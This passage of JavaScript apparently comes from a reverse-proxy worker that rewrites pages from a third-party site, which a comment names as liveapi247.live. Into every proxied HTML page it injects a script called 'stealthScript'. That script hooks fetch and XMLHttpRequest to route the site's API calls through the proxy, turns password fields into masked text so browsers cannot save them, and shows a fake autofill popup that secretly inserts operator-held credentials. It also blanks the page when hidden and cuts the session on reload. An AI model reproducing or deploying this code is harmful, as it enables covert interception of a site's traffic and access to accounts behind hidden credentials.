        }
        if (window.performance && window.performance.navigation && window.performance.navigation.type === 1) {
             window.location.replace("/api/stop-proxy");
             return;
        }

        var l=Date.now();
        setInterval(function(){if(Date.now()-l>60000)window.location.replace("/api/stop-proxy");l=Date.now();},2000);
        document.addEventListener("visibilitychange",function(){if(document.visibilityState==="hidden")document.body.style.opacity="0";else{document.body.style.opacity="1";if(Date.now()-l>60000)window.location.replace("/api/stop-proxy");l=Date.now();}});
        
        var ctx = '${encTargetTrim}';
        if(!window.location.search.includes('_ctx=')){
            var sep = window.location.search ? '&' : '?';
            window.history.replaceState(null, '', window.location.pathname + window.location.search + sep + '_ctx=' + ctx);
        }
        
        // ✅ 2. API INTERCEPTOR (Fixed for liveapi247.live)
        var targetHost = new URL("` + targetDomain + `").hostname;
        var apiTarget = "${autoApi}";
        var apiHost = apiTarget ? new URL(apiTarget).hostname : "";
        var rootDomain = targetHost.split('.').slice(-2).join('.'); 

        function shouldIntercept(urlStr) {
            if(typeof urlStr !== 'string') return false;
            try {
                var u = urlStr.startsWith('http') ? new URL(urlStr) : new URL(urlStr, window.location.origin);
                return u.hostname.includes(rootDomain) || (apiHost && u.hostname.includes(apiHost));
            } catch(e) { return false; }
        }

        var origFetch = window.fetch;
        window.fetch = async function(resource, options) {
            let reqUrl = (resource instanceof Request) ? resource.url : resource;
            if (shouldIntercept(reqUrl)) {
                let fullUrl = reqUrl.startsWith('http') ? reqUrl : new URL(reqUrl, window.location.origin).toString();
                let proxyUrl = '/__api_proxy?target=' + encodeURIComponent(fullUrl);
                if (resource instanceof Request) {
                    let newInit = { method: resource.method, headers: resource.headers, mode: 'cors', credentials: resource.credentials, redirect: resource.redirect };
                    if (['POST', 'PUT', 'PATCH'].includes(resource.method)) newInit.body = await resource.clone().blob();
                    resource = new Request(proxyUrl, newInit);
                } else resource = proxyUrl;
            }
            return origFetch.call(this, resource, options);
        };

        var origXhrOpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url) {
            if(typeof url === 'string' && shouldIntercept(url)) {
                var fullUrl = url.startsWith('http') ? url : new URL(url, window.location.origin).toString();
                url = '/__api_proxy?target=' + encodeURIComponent(fullUrl);
            }
            return origXhrOpen.apply(this, [method, url].concat(Array.prototype.slice.call(arguments, 2)));
        };

        function setNativeValue(el, val) {
            if (!el || el.value === val) return;
            try {
                const valueSetter = Object.getOwnPropertyDescriptor(el, 'value').set;
                const prototype = Object.getPrototypeOf(el);
                const prototypeValueSetter = Object.getOwnPropertyDescriptor(prototype, 'value').set;
                if (valueSetter && valueSetter !== prototypeValueSetter) prototypeValueSetter.call(el, val);
                else valueSetter.call(el, val);
                el.dispatchEvent(new Event('input', { bubbles: true }));
                el.dispatchEvent(new Event('change', { bubbles: true }));
            } catch(e){}
        }

        // ✅ 3. CUSTOM AUTOFILL POPUP & BLOCK CHROME PASSWORDS
        window.addEventListener('DOMContentLoaded', () => {
            const au = "${autoUser}"; const ap = "${autoPwd}";
            if(!au || !ap) return;

            // Stop Browser Auto Fill Prompt permanently by converting password inputs
            let style = document.createElement('style');
            style.innerHTML = '.nx-mask { -webkit-text-security: disc !important; font-family: text-security-disc, sans-serif !important; }';
            document.head.appendChild(style);

            setInterval(() => {
                document.querySelectorAll('input[type="password"]').forEach(el => {
                    el.setAttribute('type', 'text');
                    el.classList.add('nx-mask');
                    el.setAttribute('autocomplete', 'off');
                });
                document.querySelectorAll('input[type="text"], input[type="email"]').forEach(el => {
                    let n = (el.name||'').toLowerCase(), p = (el.placeholder||'').toLowerCase();
                    if(n.includes('user') || p.includes('user') || n.includes('email') || n.includes('login')) el.setAttribute('autocomplete', 'off');
                });
            }, 500);

            // Design the Custom Popup
            let popup = document.createElement('div');
            popup.innerHTML = \`
                <div style="background:#0a0a0a; border:1px solid rgba(255,255,255,0.1); padding:20px; border-radius:12px; display:flex; flex-direction:column; gap:12px; min-width:280px; box-shadow:0 20px 40px rgba(0,0,0,0.9); font-family:sans-serif;">
                    <div style="display:flex; align-items:center; gap:10px; border-bottom:1px solid rgba(255,255,255,0.05); padding-bottom:12px;">
                        <div style="width:30px; height:30px; border-radius:50%; background:rgba(74,222,128,0.1); display:flex; align-items:center; justify-content:center; border:1px solid rgba(74,222,128,0.2);">
                            <svg style="width:16px;height:16px;color:#4ade80;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8V7z"></path></svg>
                        </div>
                        <span style="color:white; font-size:15px; font-weight:600; letter-spacing:0.5px;">Auto Fill System</span>
                    </div>
                    <p style="color:#9ca3af; font-size:13px; margin:0; line-height:1.5;">Do you want to insert your panel credentials into this login form?</p>
                    <div style="display:flex; gap:10px; margin-top:5px;">
                        <button id="nx-btn-no" style="flex:1; background:rgba(255,255,255,0.05); color:#d1d5db; border:1px solid rgba(255,255,255,0.1); padding:10px; border-radius:6px; font-size:12px; font-weight:bold; cursor:pointer; text-transform:uppercase; letter-spacing:1px; transition:0.2s;">No</button>
                        <button id="nx-btn-yes" style="flex:1; background:#4f46e5; color:white; border:none; padding:10px; border-radius:6px; font-size:12px; font-weight:bold; cursor:pointer; text-transform:uppercase; letter-spacing:1px; box-shadow:0 0 15px rgba(79,70,229,0.4); transition:0.2s;">Yes, Fill It</button>
                    </div>
                </div>
            \`;
            popup.style.cssText = 'position:fixed; z-index:2147483647; top:50%; left:50%; transform:translate(-50%, -50%); display:none;';
            document.body.appendChild(popup);

            let hasFilled = false;
            let rejected = false;

            document.getElementById('nx-btn-no').onclick = (e) => {
                e.preventDefault();
                popup.style.display = 'none';
                rejected = true;
            };

            document.getElementById('nx-btn-yes').onclick = (e) => {
                e.preventDefault();
                popup.style.display = 'none';
                
                let pField = document.querySelector('.nx-mask');
                let uField = null;
                const txts = document.querySelectorAll('input[type="text"], input[type="email"], input:not([type])');
                for(let i=0; i<txts.length; i++) {
                    let el = txts[i];
                    if(el === pField || el.getBoundingClientRect().width === 0) continue;
                    let n = (el.name||'').toLowerCase(), id = (el.id||'').toLowerCase(), pl = (el.placeholder||'').toLowerCase();
                    if(!n.includes('cap') && !id.includes('cap') && !pl.includes('cap')) {
                        uField = el; break;
                    }
                }
                if(uField) setNativeValue(uField, au);
                if(pField) setNativeValue(pField, ap);
                hasFilled = true;
            };

            // Show Custom Popup on Focus
            document.addEventListener('focusin', (e) => {
                if (hasFilled || rejected) return;
                if (e.target.tagName === 'INPUT') {
                    let n = (e.target.name||'').toLowerCase();
                    let p = (e.target.placeholder||'').toLowerCase();
                    if (e.target.classList.contains('nx-mask') || e.target.type === 'password' || n.includes('user') || p.includes('user') || n.includes('login')) {
                        popup.style.display = 'block';
                    }
                }
            });
        });
    }catch(e){}
})();
<\/script>`;
                
                if (htmlText.includes("<head>")) htmlText = htmlText.replace("<head>", "<head>" + stealthScript); 
                else htmlText = stealthScript + htmlText;
                
                body = htmlText;
                responseHeaders.delete("Content-Length");
                responseHeaders.set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
            }
            return new Response(body, { status: proxyRes.status, statusText: proxyRes.statusText, headers: responseHeaders });
        }

        return new Response(landingPageHTML, { headers: { "Content-Type": "text/html;charset=UTF-8", "Cache-Control": "no-store" } });
    }
};